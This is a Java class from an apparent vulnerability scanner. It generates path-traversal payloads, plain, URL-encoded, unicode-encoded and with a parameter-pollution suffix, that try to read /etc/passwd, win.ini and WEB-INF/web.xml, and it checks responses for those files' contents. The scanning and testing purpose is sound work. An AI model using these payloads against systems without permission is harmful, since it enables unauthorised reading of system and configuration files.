package com.xzhscan.filescan;

import java.util.ArrayList;
import java.util.List;

/**
 * 文件读取 Payload 生成器（移植自 mingdong-pro FileReadScanner）
 * 支持 Linux、Windows、Java 等多种目标
 */
public class FileScanPayload {

    /** 生成文件读取 payload（移植自 mingdong-pro） */
    public static List<String> generatePayloads(String originalValue) {
        List<String> payloads = new ArrayList<>();
        String suffix = originalValue == null ? "" : " " + originalValue;

        // Linux /etc/passwd
        payloads.add(repeat("../", 40) + "etc/passwd");
        payloads.add(repeat("../", 7) + "etc/passwd");
        payloads.add("./" + repeat("../", 40) + "etc/passwd");
        payloads.add("/etc/passwd");
        payloads.add(repeat("../", 40) + "etc/passwd" + suffix);  // 参数污染
        payloads.add(repeat("%2e%2e%2f", 18) + "etc%2fpasswd");
        payloads.add(repeat("%2e%2e%2f", 6) + "etc%2fpasswd");
        payloads.add(repeat("%u002e%u002e%u2215", 18) + "etc%u2215passwd");
        payloads.add(repeat("%u002e%u002e%u2215", 6) + "etc%u2215passwd");

        // Windows win.ini
        payloads.add(repeat("../", 40) + "Windows/win.ini");
        payloads.add(repeat("../", 7) + "Windows/win.ini");
        payloads.add("./" + repeat("../", 40) + "Windows/win.ini");
        payloads.add(repeat("%2e%2e%5c", 18) + "Windows%5cwin%2eini");
        payloads.add(repeat("%2e%2e%5c", 6) + "Windows%5cwin%2eini");
        payloads.add(repeat("%u002e%u002e%u2216", 18) + "Windows%u2216win%u002eini");
        payloads.add(repeat("%u002e%u002e%u2216", 6) + "Windows%u2216win%u002eini");

        // Java WEB-INF/web.xml
        for (int i = 0; i <= 4; i++) {
            String prefix = repeat("../", i);
            payloads.add(prefix + "WEB-INF/web.xml");
            payloads.add(prefix + "WEB-INF/web.xml;" + suffix);
        }

        // 其他常见路径
        payloads.add("http:/../../../../../../../../../../../../../../../../../../etc/passwd");

        return payloads;
    }

    /** 重复字符串 n 次 */
    private static String repeat(String s, int n) {
        return s.repeat(Math.max(0, n));
    }

    /** 检测响应是否包含 /etc/passwd 内容 */
    public static boolean hasPasswd(String body) {
        if (body == null || body.isEmpty()) return false;
        return body.contains("root:")
            || body.contains("/bin/bash")
            || body.contains("/bin/sh")
            || body.contains("daemon:");
    }

    /** 检测响应是否包含 web.xml 内容 */
    public static boolean hasWebXml(String body) {
        if (body == null || body.isEmpty()) return false;
        return body.contains("<web-app")
            || body.contains("</web-app>")
            || body.contains("<servlet>");
    }

    /** 检测响应是否包含 win.ini 内容 */
    public static boolean hasWinIni(String body) {
        if (body == null || body.isEmpty()) return false;
        return body.contains("[fonts]")
            || body.contains("[extensions]")
            || body.contains("; for 16-bit app support");
    }

    /** 判断是否命中文件读取 */
    public static boolean isFileReadHit(String body) {
        return hasPasswd(body) || hasWebXml(body) || hasWinIni(body);
    }

    /** 获取命中的文件类型 */
    public static String getHitType(String body) {
        if (hasPasswd(body)) return "Linux /etc/passwd";
        if (hasWebXml(body)) return "Java WEB-INF/web.xml";
        if (hasWinIni(body)) return "Windows win.ini";
        return "Unknown";
    }
}
